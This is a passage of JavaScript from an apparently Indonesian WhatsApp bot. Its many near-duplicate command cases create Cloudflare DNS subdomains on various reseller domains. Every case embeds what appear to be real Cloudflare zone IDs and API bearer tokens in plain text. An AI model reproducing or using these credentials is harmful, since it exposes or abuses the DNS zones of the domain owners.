               let apitoken = "8WA6BgIuvFO5AL3xJZf3bsM0ts8aIZiFbxj90icK"
               let tld = "tokopanellmurah.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case 'd18': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "2dc001900c742f289eef7dbae7ab784b";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ"
               let tld = "bisnispanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd19': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e6d30663beac47216e66eeb1e1db925b";
               let apitoken = "_TVSVsDJTVHpMd7AZMv4mHlG2P5EgdGCoLcubdkd"
               let tld = "dvdz-official.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break                    
case  'd20': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "77c6588b3b36e74d07538e62ef91d6ba";
               let apitoken = "SgON4r6174fMe3h3B9wyP3caEtwUIfnVuNvSpl1k"
               let tld = "tokopanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd21': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4049d75623d46e90d616fdf878a5ed84";
               let apitoken = "qwAWquCm1cqKEzZnZUEuAbfFq3PCOLleQZifxPog"
               let tld = "store-panel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd22': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "8080d914883ed0b9e17d281f593df945";
               let apitoken = "BP2uUPgVfrM4pHW_ivo2AawAyiLqOMYoLYyS2BF7"
               let tld = "sellerpanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd66': {
    if (!isPremium) return reply("Fitur Ini Khusus Untuk Reseller Subdomain TamzDev\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Tele t.me/Matsumiko")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ec4430e647897d90930cbb9085dbba06";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp-dpwXqvg_n9HWq_jV4fzL";
               let tld = "celiaofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
             if (e[mess.success]) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By TamzDev⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
case  'd23': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6c4af9293eed7ea87c94d8effe5f2de2";
               let apitoken = "fxR0JgMIVwd0wvGIeBTymygdSMx1yNAN12lN8ure"
               let tld = "panellprivate.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
           case 'd64': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5f4a582dd80c518fb2c7a425256fb491";
               let apitoken = "iQbJQgfe6kTyEfdOy_EV8UAHKj80VgQg4t6rTjby";
               let tld = "tokopanellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
 case  'd33': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d28c394ba64bf4ecfec1917829d8bced";
               let apitoken = "86ZA4NPGG6ijzlhuRKqc3X3qbH8mgvlzOPsrBApB"
               let tld = "shopwebsite.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd24': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cada0ecef8f1e8d904435d469aef1b05";
               let apitoken = "54kx4yvi3CBqomC99WSaqZo9tbxHoe9U-ncBIVMx"
               let tld = "mypanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd25': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d318f96a6327c5340d136415e860f545";
               let apitoken = "RTe9hBdh_-nt0wzOvYN183JyQC011yaiodQ7Po1b"
               let tld = "kangpanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd26': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "8132a433dc4eea653e38e168f2f45fc0";
               let apitoken = "33F2gfJ0cEoLv4NlEqLYGd6Ahc5_dzyUH_ClKuX_"
               let tld = "jasapanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd68': {
    if (!isPremium) return reply("Fitur Ini Khusus Untuk Reseller Subdomain TamzDev\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Owner")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5ac16dadc6a80d53657786f70c509a92";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp";
               let tld = "panellofficial.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e[mess.success]) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By TamzDev⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
case  'd27': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5024bc4a02924cf69ddf4dfa6ee96069";
               let apitoken = "OajJ0jtCB0FTFwfdiTB_ktzNKFWAmsENFdlE4Hvd"
               let tld = "dewapanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
